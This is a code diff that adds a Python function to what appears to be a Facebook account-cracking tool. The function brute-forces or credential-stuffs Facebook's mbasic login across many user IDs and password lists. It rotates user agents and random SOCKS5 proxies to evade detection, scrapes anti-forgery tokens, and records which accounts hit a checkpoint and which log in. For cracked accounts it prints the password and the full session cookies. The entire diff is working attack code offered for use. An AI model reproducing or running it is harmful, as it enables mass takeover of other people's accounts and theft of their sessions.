@@ -1640,6 +1640,49 @@ def kontol(idf,pwv):
 
 
 def mbasic(idf,pwv):
+	global loop,ok,cp
+	ua = random.choice(uahk)
+	ua2 = random.choice(taik1)
+	ses = requests.Session()
+	prog.update(des,description=f"[[bold green]Mbasic[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1733613883443%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df06d60674ea79429a%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Fsignin%252Fsignup%252Fpassword%253FforceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Df49a1381a0661a850%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96388283b9069929%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%2526frame%253Df993dbfe52a625a68%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96388283b9069929%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffa9d087b96976262a%26relation%3Dopener%26frame%3Df993dbfe52a625a68%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=733768086637828&kid_directed_site=0&app_id=733768086637828&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1733613883443%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df06d60674ea79429a%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Fsignin%252Fsignup%252Fpassword%253FforceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Df49a1381a0661a850%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96388283b9069929%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%2526frame%253Df993dbfe52a625a68%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96388283b9069929%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffa9d087b96976262a%26relation%3Dopener%26frame%3Df993dbfe52a625a68%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1733613883443%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df06d60674ea79429a%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Fsignin%252Fsignup%252Fpassword%253FforceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Df49a1381a0661a850%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96388283b9069929%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffa9d087b96976262a%2526relation%253Dopener%2526frame%253Df993dbfe52a625a68%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96388283b9069929%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffa9d087b96976262a%26relation%3Dopener%26frame%3Df993dbfe52a625a68%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				cp+=1
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}")
+				cetak(tree)
+				akun.append(idf+'|'+pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(f"  ")
+				tree.add(f"[bold green]{idf}|{pw}")
+				tree.add(f"[bold green]{kuki}")
+				cetak(tree) 
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			sleep(31)
+	loop+=1
+
+
+def mbasicc(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} MBASIC {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
